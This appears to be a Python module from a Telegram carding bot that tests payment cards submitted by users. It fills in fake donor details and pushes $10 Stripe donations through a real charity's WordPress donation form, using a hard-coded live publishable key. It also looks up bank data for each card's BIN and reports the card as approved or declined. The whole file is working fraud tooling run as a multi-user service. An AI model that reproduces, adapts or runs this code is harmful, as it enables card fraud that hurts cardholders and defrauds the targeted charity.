# gates/scharge.py - Concurrent request handling for 50+ users

import asyncio
import json
import re
import time
import httpx
import random
import string
from datetime import datetime
from shared import (
    PLANS, get_user_plan, is_user_banned,
    get_user_session, increment_gate_usage,
    can_user_use_command, update_user_cooldown,
    get_gate_usage_count
)

class StripeChargeChecker:
    def __init__(self, session):
        self.session = session
        self.user_agent = self.generate_user_agent()
        self.bin_cache = {}
        self.last_bin_request = 0
        self.request_timeout = 35.0
        self.base_url = "https://www.beitsahourusa.org"
        self.stripe_key = "pk_live_51HhefWFVQkom3lAfFiSCo1daFNqT2CegRXN4QedqlScZqZRP55JVTekqb4d68wMYUY4bfg8M9eJK8A3pou9EKdhW00QAVLLIdm"

        self.headers = {
            "User-Agent": self.user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1"
        }

        # Country code to name mapping
        self.country_map = {
            'US': 'United States', 'GB': 'United Kingdom', 'CA': 'Canada', 'AU': 'Australia',
            'DE': 'Germany', 'FR': 'France', 'IT': 'Italy', 'ES': 'Spain', 'NL': 'Netherlands',
            'JP': 'Japan', 'SG': 'Singapore', 'AE': 'United Arab Emirates', 'IN': 'India',
            'BR': 'Brazil', 'MX': 'Mexico', 'TW': 'Taiwan', 'CN': 'China', 'HK': 'Hong Kong',
            'KR': 'South Korea', 'RU': 'Russia', 'CH': 'Switzerland', 'SE': 'Sweden',
            'NO': 'Norway', 'DK': 'Denmark', 'FI': 'Finland', 'BE': 'Belgium', 'AT': 'Austria',
            'PT': 'Portugal', 'IE': 'Ireland', 'NZ': 'New Zealand', 'ZA': 'South Africa',
            'TR': 'Turkey', 'SA': 'Saudi Arabia', 'TH': 'Thailand', 'MY': 'Malaysia',
            'ID': 'Indonesia', 'PH': 'Philippines', 'VN': 'Vietnam', 'IL': 'Israel',
            'EG': 'Egypt', 'AR': 'Argentina', 'CL': 'Chile', 'CO': 'Colombia', 'PE': 'Peru',
            'VE': 'Venezuela', 'GR': 'Greece', 'PL': 'Poland', 'CZ': 'Czech Republic',
            'HU': 'Hungary', 'RO': 'Romania', 'BG': 'Bulgaria', 'UA': 'Ukraine',
            'SK': 'Slovakia', 'SI': 'Slovenia', 'HR': 'Croatia', 'RS': 'Serbia',
            'EE': 'Estonia', 'LV': 'Latvia', 'LT': 'Lithuania', 'IS': 'Iceland',
            'LU': 'Luxembourg', 'CY': 'Cyprus', 'MT': 'Malta', 'MC': 'Monaco',
            'AD': 'Andorra', 'SM': 'San Marino', 'VA': 'Vatican City', 'LI': 'Liechtenstein',
            'JE': 'Jersey', 'GG': 'Guernsey', 'IM': 'Isle of Man', 'FO': 'Faroe Islands',
            'GL': 'Greenland', 'GI': 'Gibraltar', 'BM': 'Bermuda', 'KY': 'Cayman Islands',
            'VG': 'British Virgin Islands', 'TC': 'Turks and Caicos Islands', 'MS': 'Montserrat',
            'AI': 'Anguilla', 'AG': 'Antigua and Barbuda', 'BS': 'Bahamas', 'BB': 'Barbados',
            'BZ': 'Belize', 'CR': 'Costa Rica', 'DM': 'Dominica', 'DO': 'Dominican Republic',
            'SV': 'El Salvador', 'GD': 'Grenada', 'GT': 'Guatemala', 'HT': 'Haiti',
            'HN': 'Honduras', 'JM': 'Jamaica', 'NI': 'Nicaragua', 'PA': 'Panama',
            'KN': 'Saint Kitts and Nevis', 'LC': 'Saint Lucia', 'VC': 'Saint Vincent and the Grenadines',
            'TT': 'Trinidad and Tobago', 'UY': 'Uruguay', 'PY': 'Paraguay', 'BO': 'Bolivia',
            'EC': 'Ecuador', 'GY': 'Guyana', 'SR': 'Suriname', 'GF': 'French Guiana',
            'MQ': 'Martinique', 'GP': 'Guadeloupe', 'RE': 'Réunion', 'YT': 'Mayotte',
            'PM': 'Saint Pierre and Miquelon', 'WF': 'Wallis and Futuna', 'PF': 'French Polynesia',
            'NC': 'New Caledonia', 'TK': 'Tokelau', 'CK': 'Cook Islands', 'NU': 'Niue',
            'WS': 'Samoa', 'TO': 'Tonga', 'FJ': 'Fiji', 'VU': 'Vanuatu', 'SB': 'Solomon Islands',
            'KI': 'Kiribati', 'TV': 'Tuvalu', 'FM': 'Micronesia', 'MH': 'Marshall Islands',
            'PW': 'Palau', 'NR': 'Nauru', 'PG': 'Papua New Guinea', 'MP': 'Northern Mariana Islands',
            'GU': 'Guam', 'AS': 'American Samoa', 'PR': 'Puerto Rico', 'VI': 'U.S. Virgin Islands',
            'UM': 'U.S. Minor Outlying Islands', 'AW': 'Aruba', 'CW': 'Curaçao', 'SX': 'Sint Maarten',
            'BQ': 'Caribbean Netherlands', 'BL': 'Saint Barthélemy', 'MF': 'Saint Martin',
            'KM': 'Comoros', 'DJ': 'Djibouti', 'ER': 'Eritrea', 'ET': 'Ethiopia',
            'KE': 'Kenya', 'MG': 'Madagascar', 'MW': 'Malawi', 'MU': 'Mauritius',
            'YT': 'Mayotte', 'MZ': 'Mozambique', 'RW': 'Rwanda', 'SC': 'Seychelles',
            'SO': 'Somalia', 'TZ': 'Tania', 'UG': 'Uganda', 'ZM': 'Zambia',
            'ZW': 'Zimbabwe', 'AO': 'Angola', 'CM': 'Cameroon', 'CF': 'Central African Republic',
            'TD': 'Chad', 'CG': 'Republic of the Congo', 'CD': 'Democratic Republic of the Congo',
            'GQ': 'Equatorial Guinea', 'GA': 'Gabon', 'ST': 'São Tomé and Príncipe',
            'BW': 'Botswana', 'LS': 'Lesotho', 'NA': 'Namibia', 'SZ': 'Eswatini',
            'LY': 'Libya', 'MA': 'Morocco', 'DZ': 'Algeria', 'TN': 'Tunisia',
            'MR': 'Mauritania', 'SN': 'Senegal', 'GM': 'Gambia', 'GN': 'Guinea',
            'GW': 'Guinea-Bissau', 'LR': 'Liberia', 'SL': 'Sierra Leone', 'CI': 'Ivory Coast',
            'BF': 'Burkina Faso', 'BJ': 'Benin', 'NG': 'Nigeria', 'TG': 'Togo',
            'GH': 'Ghana', 'ML': 'Mali', 'NE': 'Niger', 'CV': 'Cape Verde',
            'SD': 'Sudan', 'SS': 'South Sudan', 'DJ': 'Djibouti', 'ER': 'Eritrea',
            'IQ': 'Iraq', 'IR': 'Iran', 'JO': 'Jordan', 'KW': 'Kuwait', 'LB': 'Lebanon',
            'OM': 'Oman', 'QA': 'Qatar', 'SY': 'Syria', 'YE': 'Yemen', 'BH': 'Bahrain',
            'PS': 'Palestine', 'AF': 'Afghanistan', 'BD': 'Bangladesh', 'BT': 'Bhutan',
            'MM': 'Myanmar', 'KH': 'Cambodia', 'LA': 'Laos', 'MN': 'Mongolia',
            'NP': 'Nepal', 'PK': 'Pakistan', 'LK': 'Sri Lanka', 'MV': 'Maldives',
            'KG': 'Kyrgyzstan', 'KZ': 'Kazakhstan', 'TJ': 'Tajikistan', 'TM': 'Turkmenistan',
            'UZ': 'Uzbekistan', 'AM': 'Armenia', 'AZ': 'Azerbaijan', 'GE': 'Georgia',
            'MD': 'Moldova', 'BY': 'Belarus', 'AL': 'Albania', 'BA': 'Bosnia and Herzegovina',
            'MK': 'North Macedonia', 'ME': 'Montenegro', 'XK': 'Kosovo'
        }

    def generate_user_agent(self):
        browsers = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{0}.0.0.0 Safari/537.36"
        ]
        version = random.randint(110, 139)
        return random.choice(browsers).format(version)

    async def get_bin_info(self, cc):
        bin_number = cc[:6] if cc else '000000'
        bin_number = ''.join(c for c in bin_number if c.isdigit())
        bin_number = bin_number.ljust(6, '0')[:6]

        if bin_number in self.bin_cache:
            return self.bin_cache[bin_number]

        now = time.time()
        if now - self.last_bin_request < 2.0:
            await asyncio.sleep(2.0 - (now - self.last_bin_request))
        self.last_bin_request = time.time()

        try:
            async with httpx.AsyncClient(timeout=self.request_timeout) as client:
                response = await client.get(
                    f"https://bins.antipublic.cc/bins/{bin_number}",
                    headers={'User-Agent': self.user_agent}
                )

                if response.status_code == 200:
                    try:
                        data = response.json()
                        country_code = data.get('country', 'N/A')
                        country_name = self.country_map.get(country_code, 'N/A')

                        result = {
                            'scheme': data.get('brand', 'N/A').upper(),
                            'type': data.get('type', 'N/A').upper(),
                            'brand': data.get('brand', 'N/A'),
                            'bank': data.get('bank', 'N/A'),
                            'country': country_name,
                            'country_code': country_code
                        }
                        self.bin_cache[bin_number] = result
                        return result
                    except json.JSONDecodeError:
                        pass
        except Exception:
            pass

        return {
            'scheme': 'N/A',
            'type': 'N/A',
            'brand': 'N/A',
            'bank': 'N/A',
            'country': 'N/A',
            'country_code': 'N/A'
        }

    async def format_response(self, cc, mes, ano, cvv, status, message, username, elapsed_time, bin_info):
        emoji = "✅" if status == "APPROVED" else "❌"
        return (
            "╔═✦✧✦═╦═✦✧✦═╦═✦✧✦═╗\n"
            f"⚡ 𝓢𝓽𝓻𝓲𝓹𝓮 𝓒𝓱𝓪𝓻𝓰𝓮\n"
            "─────────◆─────────\n"
            f" 𝑺𝒕𝒂𝒕𝒖𝒔: {status} {emoji}\n"
            f" 𝑮𝑨𝑻𝑬 : 𝘚𝘵𝘳𝘪𝘱𝘦 𝘊𝘩𝘢𝘳𝘨𝘦 𝟷0$♻️\n"
            f" 𝑪𝑪: `{cc}|{mes}|{ano}|{cvv}`\n"
            "─────────◆─────────\n"
            f" 𝑹𝒆𝒔𝒑𝒐𝒏𝒔𝒆: {message}\n"
            f" 𝑩𝒂𝒏𝒌: {bin_info['bank']}\n"
            f" 𝑻𝒚𝒑𝒆: {bin_info['scheme']} - {bin_info['type']}\n"
            f" 𝑪𝒐𝒖𝒏𝒕𝒓𝒚: {bin_info['country']}({bin_info['country_code']})\n"
            "─────────◆─────────\n"
            f" 𝑻𝒊𝒎𝒆: {elapsed_time:.2f}s\n"
            f" 𝑪𝒉𝒆𝒄𝒌𝒆𝒅 𝑩𝒚: @{username}\n"
            "╚═✦✧✦═╩═✦✧✦═╩═✦✧✦═╝"
        )

    def get_processing_message(self, cc, mes, ano, cvv, username, user_plan):
        return (
            "➺➺➺  𝓢𝓽𝓻𝓲𝓹𝓮 𝓒𝓱𝓪𝓻𝓰𝓮   ➺➺➺\n"
            f"𝑺𝒕𝒂𝒕𝒖𝒔 → 𝑷𝒓𝒐𝒄𝒆𝒔𝒔𝒊𝒏𝒈 𝑪𝑪.....\n"
            f"𝑮𝑨𝑻𝑬 →  𝘚𝘵𝘳𝘪𝘱𝘦 𝘊𝘩𝘢𝘳𝘨𝘦 𝟷0$♻️\n"
            f"𝑪𝑪 →  `{cc}|{mes}|{ano}|{cvv}`\n"
            "✦─✧─✦─✧─✦─✧─✦\n"
            f"𝑼𝒔𝒆𝒓 𝑷𝒍𝒂𝒏 →  {user_plan}\n"
            f"𝑪𝒉𝒆𝒄𝒌𝒆𝒅 𝑩𝒚 →  @{username}\n"
        )

    async def get_form_tokens(self, client):
        """Get required form tokens"""
        try:
            response = await client.get(
                f"{self.base_url}/campaigns/donate/",
                headers=self.headers
            )

            if response.status_code != 200:
                return None, f"HTTP {response.status_code}"

            html = response.text

            tokens = {}

            # Extract form ID
            form_id_match = re.search(r'name="charitable_form_id" value="([^"]+)"', html)
            if form_id_match:
                tokens['charitable_form_id'] = form_id_match.group(1)
            else:
                return None, "Missing form ID"

            # Extract donation nonce
            nonce_match = re.search(r'name="_charitable_donation_nonce" value="([^"]+)"', html)
            if nonce_match:
                tokens['donation_nonce'] = nonce_match.group(1)
            else:
                return None, "Missing donation nonce"

            # Extract campaign ID
            campaign_match = re.search(r'name="campaign_id" value="([^"]+)"', html)
            tokens['campaign_id'] = campaign_match.group(1) if campaign_match else '1206'

            return tokens, None

        except Exception as e:
            return None, f"Token error: {str(e)}"

    def extract_stripe_error(self, response_text):
        """Extract detailed error from Stripe response"""
        try:
            data = json.loads(response_text)
            if 'error' in data:
                return data['error'].get('message', 'Card declined')
        except:
            pass

        if 'insufficient_funds' in response_text.lower():
            return "Insufficient funds"
        elif 'contact your card issuer' in response_text.lower():
            return "Contact your card issuer"
        elif 'card was declined' in response_text.lower():
            return "Card declined"

        return "Card declined"

    async def check_card(self, card_details, username, user_plan):
        """Optimized check method for concurrent requests"""
        start_time = time.time()

        try:
            cc_parts = card_details.split('|')
            if len(cc_parts) < 4:
                return await self.format_response("", "", "", "", "ERROR", "Invalid format", username, time.time()-start_time, {})

            cc = cc_parts[0].strip()
            mes = cc_parts[1].strip()
            ano = cc_parts[2].strip()
            cvv = cc_parts[3].strip()

            if len(ano) == 2:
                ano = '20' + ano

            # Generate user details
            first_name = random.choice(["John", "Michael", "David", "James", "Robert"])
            last_name = random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones"])
            email = f"{first_name.lower()}.{last_name.lower()}{random.randint(100,999)}@gmail.com"

            bin_info = await self.get_bin_info(cc)

            # Use efficient async client with connection pooling
            async with httpx.AsyncClient(
                headers=self.headers,
                timeout=self.request_timeout,
                limits=httpx.Limits(max_connections=100, max_keepalive_connections=20),
                follow_redirects=True
            ) as client:

                # Step 1: Get form tokens
                tokens, error = await self.get_form_tokens(client)
                if not tokens:
                    return await self.format_response(cc, mes, ano, cvv, "ERROR", error, username, time.time()-start_time, bin_info)

                # Step 2: Create payment method
                stripe_headers = {
                    "User-Agent": self.user_agent,
                    "Accept": "application/json",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Origin": "https://js.stripe.com",
                    "Referer": "https://js.stripe.com/",
                    "Authorization": f"Bearer {self.stripe_key}"
                }

                payment_data = {
                    'type': 'card',
                    'billing_details[name]': f"{first_name} {last_name}",
                    'billing_details[email]': email,
                    'billing_details[address][postal_code]': '10080',
                    'card[number]': cc,
                    'card[cvc]': cvv,
                    'card[exp_month]': mes,
                    'card[exp_year]': ano[-2:],
                    'key': self.stripe_key
                }

                payment_response = await client.post(
                    "https://api.stripe.com/v1/payment_methods",
                    data=payment_data,
                    headers=stripe_headers
                )

                if payment_response.status_code != 200:
                    error_msg = self.extract_stripe_error(payment_response.text)
                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", error_msg, username, time.time()-start_time, bin_info)

                payment_result = payment_response.json()

                if 'error' in payment_result:
                    error_msg = self.extract_stripe_error(json.dumps(payment_result))
                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", error_msg, username, time.time()-start_time, bin_info)

                payment_method_id = payment_result.get('id')
                if not payment_method_id:
                    return await self.format_response(cc, mes, ano, cvv, "ERROR", "No payment method created", username, time.time()-start_time, bin_info)

                # Step 3: Submit donation
                donation_headers = {
                    **self.headers,
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "X-Requested-With": "XMLHttpRequest",
                    "Origin": self.base_url,
                    "Referer": f"{self.base_url}/campaigns/donate/"
                }

                donation_data = {
                    'charitable_form_id': tokens['charitable_form_id'],
                    tokens['charitable_form_id']: '',
                    '_charitable_donation_nonce': tokens['donation_nonce'],
                    '_wp_http_referer': '/campaigns/donate/',
                    'campaign_id': tokens['campaign_id'],
                    'description': 'Donate to Christian Families in Bethlehem',
                    'ID': '0',
                    'custom_donation_amount': '10.00',
                    'first_name': first_name,
                    'last_name': last_name,
                    'email': email,
                    'additiona_message': 'Support',
                    'anonymous_donation': '1',
                    'gateway': 'stripe',
                    'stripe_payment_method': payment_method_id,
                    'cover_fees': '1',
                    'action': 'make_donation',
                    'form_action': 'make_donation'
                }

                donation_response = await client.post(
                    f"{self.base_url}/wp-admin/admin-ajax.php",
                    data=donation_data,
                    headers=donation_headers
                )

                if donation_response.status_code != 200:
                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", f"Donation failed: HTTP {donation_response.status_code}", username, time.time()-start_time, bin_info)

                result = donation_response.json()

                # Proper success detection
                if isinstance(result, dict) and result.get('success') is True and 'redirect_url' in result:
                    return await self.format_response(cc, mes, ano, cvv, "APPROVED", "Successfully charged $10 donation", username, time.time()-start_time, bin_info)
                else:
                    message = result.get('data', {}).get('message', 'Payment declined') if isinstance(result, dict) else 'Payment declined'
                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", message, username, time.time()-start_time, bin_info)

        except Exception as e:
            return await self.format_response(cc, mes, ano, cvv, "ERROR", f"Processing error: {str(e)}", username, time.time()-start_time, await self.get_bin_info(cc))

# Concurrent request management
semaphore = asyncio.Semaphore(50)  # Allow 50 concurrent requests

async def handle_stripe_charge(event):
    user_id = event.sender_id
    if is_user_banned(user_id):
        await event.respond("⛔ You have been banned from using this bot.")
        return

    args = event.message.text.split()
    if len(args) < 2:
        await event.respond("❗Please provide card details in format: `/sc cc|mm|yy|cvv`")
        return

    card_details = args[1]
    username = event.sender.username or str(user_id)
    user_plan = get_user_plan(user_id)

    can_use, reason = can_user_use_command(user_id, event.is_group, is_gate_command=True)
    if not can_use:
        await event.respond(reason)
        return

    session = get_user_session(user_id)
    checker = StripeChargeChecker(session)

    cc_parts = card_details.split('|')
    if len(cc_parts) < 4:
        await event.respond("❌ Invalid card format. Use: `/sc cc|mm|yy|cvv`")
        return

    cc = cc_parts[0]
    mes = cc_parts[1]
    ano = cc_parts[2]
    cvv = cc_parts[3]

    processing_msg = await event.respond(
        checker.get_processing_message(cc, mes, ano, cvv, username, user_plan))

    # Use semaphore for concurrent request limiting
    async with semaphore:
        result = await checker.check_card(card_details, username, user_plan)

    increment_gate_usage(user_id)
    update_user_cooldown(user_id)

    await processing_msg.edit(result)

async def sc_help(event):
    await event.respond(
        "🔍 **How to Check Stripe Donation**\n\n"
        "✨ Use the following format to charge $10:\n\n"
        "`/sc <cc|mm|yy|cvv>`\n\n"
        "🔑 **Examples:**\n"
        "`/sc 1234567891238547|12|2025|123`\n\n"
        "🚀 Enjoy your Stripe checking!"
    )
